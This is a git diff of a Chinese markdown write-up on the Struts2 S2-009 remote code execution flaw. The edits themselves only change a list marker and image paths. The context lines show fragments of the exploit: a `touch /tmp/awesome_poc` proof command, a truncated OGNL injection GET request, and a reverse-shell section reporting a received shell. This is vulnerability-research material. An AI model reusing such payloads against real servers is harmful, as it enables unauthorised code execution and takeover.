@@ -12,7 +12,7 @@ Struts2 对 s2-003 的修复方法是禁止静态方法调用，在 s2-005 中�
 
 漏洞详情:
 
-- http://struts.apache.org/docs/s2-009.html
+* http://struts.apache.org/docs/s2-009.html
 
 ## 漏洞影响
 
@@ -81,11 +81,11 @@ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Tride
 Connection: close
 ```
 
-![image-20220301165654308](images/202203011656411.png)
+![image-20220301165654308](../.gitbook/assets/202203011656411.png)
 
 由于该 POC 没有回显，所以调用的是 `touch /tmp/awesome_poc` 命令，查看/tmp 目录发现已经成功：
 
-![image-20220301165639798](images/202203011656842.png)
+![image-20220301165639798](../.gitbook/assets/202203011656842.png)
 
 ### 反弹 shell
 
@@ -122,4 +122,4 @@ GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMeth
 
 成功接收反弹 shell：
 
-![image-20220301165932437](images/202203011659531.png)
+![image-20220301165932437](../.gitbook/assets/202203011659531.png)
